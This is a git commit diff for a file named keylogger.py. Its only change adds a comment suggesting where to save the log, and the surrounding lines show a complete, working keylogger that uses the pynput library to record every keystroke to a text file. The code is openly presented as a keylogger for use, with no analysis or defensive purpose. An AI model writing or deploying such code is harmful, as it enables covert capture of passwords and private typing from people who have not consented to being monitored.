53eee7a053f5b510c045b16f432d150329feaeea
hamza efe <47950718+hamzaefe44@users.noreply.github.com>
2022-05-18 22:57:06 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener
 
 def on_press(key):
-    with open("log.txt", "a") as f:
+    with open("log.txt", "a") as f: #path of your choice e.x: "C:\\Users\\USER_NAME\\Desktop\\log.txt"
         f.write(str(key)+'\n')
 
 with Listener(on_press=on_press) as listener:
